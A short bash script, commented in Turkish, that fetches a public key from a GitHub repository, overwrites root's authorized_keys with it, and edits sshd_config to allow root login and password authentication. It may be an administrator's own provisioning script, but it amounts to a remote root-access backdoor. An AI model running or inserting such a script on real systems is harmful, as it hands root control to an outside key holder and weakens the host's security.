#!/bin/bash

# GitHub'dan public key'in bulunduğu URL
GITHUB_URL="https://raw.githubusercontent.com/dogaatac/dogibokubuseferyemedi/refs/heads/main/dene.pub"

# Public key'i /tmp dizinine indir
curl -s -o /tmp/public_key.pub $GITHUB_URL

# İndirme işlemi başarılı mı kontrol et
if [ $? -ne 0 ]; then
    echo "Public key GitHub'dan indirilemedi. Lütfen URL'yi ve bağlantıyı kontrol edin."
    exit 1
fi

# Root için ~/.ssh dizini yoksa oluştur
mkdir -p /root/.ssh

# Root için ~/.ssh/authorized_keys dosyasını public key ile güncelle
cat /tmp/public_key.pub > /root/.ssh/authorized_keys

# İzinleri ayarla
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh

# Geçici dosyayı kaldır
rm /tmp/public_key.pub

# SSH yapılandırma dosyasını düzenle
SSH_CONFIG="/etc/ssh/sshd_config"

# Yedek al (ilk seferde yedek alır)
if [ ! -f "$SSH_CONFIG.bak" ]; then
    cp $SSH_CONFIG $SSH_CONFIG.bak
fi

# Gerekli ayarları yap
sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' $SSH_CONFIG
sed -i 's/^#*PubkeyAuthentication.*/PubkeyAuthentication yes/' $SSH_CONFIG
sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' $SSH_CONFIG

# SSH hizmetini yeniden başlat
systemctl restart ssh

echo "Public key başarıyla güncellendi ve root için SSH ayarları yapılandırıldı."
